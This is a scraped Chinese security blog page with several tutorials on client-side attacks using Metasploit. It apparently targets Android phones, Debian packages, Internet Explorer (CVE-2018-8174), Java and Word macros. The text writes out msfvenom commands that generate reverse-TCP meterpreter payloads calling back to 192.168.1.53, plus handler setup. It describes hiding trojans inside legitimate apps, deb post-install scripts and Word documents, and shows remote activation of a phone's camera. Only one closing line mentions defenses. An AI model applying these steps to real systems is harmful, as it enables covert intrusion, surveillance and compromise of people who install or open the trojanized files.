<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
<p>步骤2：监听</p>
<p>启动msf</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p>加载渗透模块并配置参数</p>
<p>use exploit/multi/handler</p>
<p>set payload android/meterpreter/reverse_tcp</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤3：</p>
<p>手机端下载并打开程序</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
<p>kali端，会话建立成功</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
<p>操控命令说明补充：</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
<p><strong>步骤1：搭建环境</strong></p>
<p>禁用ipv6</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
<p>下载工具</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
<p>解压文件</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
<p>解压结果</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
<p>修改程序</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
<p><strong>步骤2：</strong>注入后门到apk</p>
<p>载入要注入后门的apk和apktool.jar工具到kali（注意路径）</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
<p>进入apk工具（这里用到逆向与注入）</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
<p>选择第3项（输入3)，然后配置参数</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
<p>补充：</p>
<p>出错情况1：</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
<p>出错情况2：</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
<p>解决方法</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤4：启动apache2服务</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
<p>把apk放到根目录方便下载</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
<p>步骤5：安卓手机下载并安装apk</p>
<p>安装过程略，启动运行软件后</p>
<p>直接上结果</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
<p>补充：</p>
<p>启动摄像头</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
<p>注意：手机端会提示是是否打开摄像头</p>
<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818171041850.png" alt="image-20210818171041850"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">利用deb包-0day-java环境进行渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-18 16:17:01" itemprop="dateCreated datePublished" datetime="2021-08-18T16:17:01+08:00">2021-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-26 16:08:37" itemprop="dateModified" datetime="2021-08-26T16:08:37+08:00">2021-08-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="利用deb包-0day-java环境进行渗透"><a href="#利用deb包-0day-java环境进行渗透" class="headerlink" title="利用deb包-0day-java环境进行渗透"></a>利用deb包-0day-java环境进行渗透</h1><h2 id="一、制作恶意deb软件包来触发后门"><a href="#一、制作恶意deb软件包来触发后门" class="headerlink" title="一、制作恶意deb软件包来触发后门"></a>一、制作恶意deb软件包来触发后门</h2><p><strong>以freesweep软件包为例子</strong> </p>
<p>步骤1：下载正版的freesweep软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154438382.png" alt="image-20210817154438382"></p>
<p>步骤2：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154803409.png" alt="image-20210817154803409"></p>
<p><strong>命令说明</strong>：把EOF重定向（写入）到/root/free/DEBIAN/control里；EOF是指其下一行开始到最后EOF那一行的所有内容</p>
<p><strong>补充</strong>：也可以进入目录用vim写入，如下</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154555203.png" alt="image-20210817154555203"></p>
<p>确保路径存在（目录不存在，则要自己创建），注意大小写、顺序。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154651297.png" alt="image-20210817154651297"></p>
<p>步骤3：创建deb软件包，安装后脚步文件来加载后门</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155435610.png" alt="image-20210817155435610"></p>
<p>设置文件执行权限</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155637985.png" alt="image-20210817155637985"></p>
<p>重新打包软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155808883.png" alt="image-20210817155808883"></p>
<p>说明：文件夹叫什么名，打包出来的软件包就叫什么名</p>
<p>步骤4：效果演示</p>
<p><strong>监听</strong></p>
<p>环境：一台kali（自己监听自己）</p>
<p>进入msf</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160019739.png" alt="image-20210817160019739"></p>
<p>加载监听模块并配置参数</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160301457.png" alt="image-20210817160301457"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160347828.png" alt="image-20210817160347828"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160457759.png" alt="image-20210817160457759"></p>
<p>打开另外一个控制台安装软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160543619.png" alt="image-20210817160543619"></p>
<p>结果：会话建立成功</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160622947.png" alt="image-20210817160622947"></p>
<p>补充：软件包被卸载后，会话会自动断开</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160756710.png" alt="image-20210817160756710"></p>
<h2 id="二、利用0DAY漏洞CVE-2018-8174获取shell"><a href="#二、利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="二、利用0DAY漏洞CVE-2018-8174获取shell"></a>二、利用0DAY漏洞CVE-2018-8174获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165222216.png" alt="image-20210817165222216"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165327932.png" alt="image-20210817165327932"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165542797.png" alt="image-20210817165542797"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165853688.png" alt="image-20210817165853688"></p>
<p>将恶意文件拷贝到web根目录下，</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170035572.png" alt="image-20210817170035572"></p>
<p>开启apache服务</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170128424.png" alt="image-20210817170128424"></p>
<p>加载和配置模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170259965.png" alt="image-20210817170259965"></p>
<p>在window下启动恶意文件，要注意payload设置</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170320356.png" alt="image-20210817170320356"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170330785.png" alt="image-20210817170330785"></p>
<p>启动，监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170444127.png" alt="image-20210817170444127"></p>
<p>3.启动恶意文件</p>
<p>注意：该漏洞针对的是ie浏览器和IE内核的浏览器（如360浏览器）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170646899.png" alt="image-20210817170646899"></p>
<p>结果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170726851.png" alt="image-20210817170726851"></p>
<h2 id="三、基于java环境的漏洞获取shell"><a href="#三、基于java环境的漏洞获取shell" class="headerlink" title="三、基于java环境的漏洞获取shell"></a>三、基于java环境的漏洞获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101510091.png" alt="image-20210818101510091"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101548466.png" alt="image-20210818101548466"></p>
<p>说明：该漏洞与jre的版本有关，其他版本可能不行</p>
<p>步骤1：加载模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101727843.png" alt="image-20210818101727843"></p>
<p>步骤2：配置payload并启动</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101835440.png" alt="image-20210818101835440"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101854499.png" alt="image-20210818101854499"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101932255.png" alt="image-20210818101932255"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102202346.png" alt="image-20210818102202346"></p>
<p>补充：需要打开apache2服务</p>
<p>步骤3：可能会弹出的提示框操作与结果展示</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102503192.png" alt="image-20210818102503192"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102538395.png" alt="image-20210818102538395"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102625422.png" alt="image-20210818102625422"></p>
<p>结果（会话可能后台运行了）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102811873.png" alt="image-20210818102811873"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102839600.png" alt="image-20210818102839600"></p>
<h2 id="四、利用宏感染word文档获取shell"><a href="#四、利用宏感染word文档获取shell" class="headerlink" title="四、利用宏感染word文档获取shell"></a>四、利用宏感染word文档获取shell</h2><p>步骤1：生成宏恶意文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818103109953.png" alt="image-20210818103109953"></p>
<p>指令：msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104623212.png" alt="image-20210818104623212"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104647745.png" alt="image-20210818104647745"></p>
<p>将上面这段代码放到word里的宏。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104807569.png" alt="image-20210818104807569"></p>
<p>payload放到文件内容（将其隐藏）</p>
<p>如图操作</p>
<p>宏设置：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105017122.png" alt="image-20210818105017122"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105121898.png" alt="image-20210818105121898"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105236492.png" alt="image-20210818105236492"></p>
<p>payload操作：</p>
<p>将kali生成的payload代码放入刚保存的带宏的文件中</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105437540.png" alt="image-20210818105437540"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105600439.png" alt="image-20210818105600439"></p>
<p>隐藏效果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105613376.png" alt="image-20210818105613376"></p>
<p>再在前面输入正常内容</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105658221.png" alt="image-20210818105658221"></p>
<p>步骤2：监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105902905.png" alt="image-20210818105902905"></p>
<p>LHOST是指监听者的ip地址</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105925383.png" alt="image-20210818105925383"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105957052.png" alt="image-20210818105957052"></p>
<p>步骤3：效果</p>
<p>目标机打开文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110059162.png" alt="image-20210818110059162"></p>
<p>攻击者</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110159404.png" alt="image-20210818110159404"></p>
<p>补充：该文件如果发到其他主机，其他主机也可能会被感染/遭受攻击</p>
<p><strong>应对方法</strong>：安装杀毒软件，杀毒软件会发出警告或杀掉木马。也可以查看宏来判断</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-17 10:38:12 / 修改时间：10:38:54" itemprop="dateCreated datePublished" datetime="2021-08-17T10:38:12+08:00">2021-08-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h1><h2 id="一、客户端渗透原理"><a href="#一、客户端渗透原理" class="headerlink" title="一、客户端渗透原理"></a>一、客户端渗透原理</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201142972.png" alt="image-20210816201142972"></p>
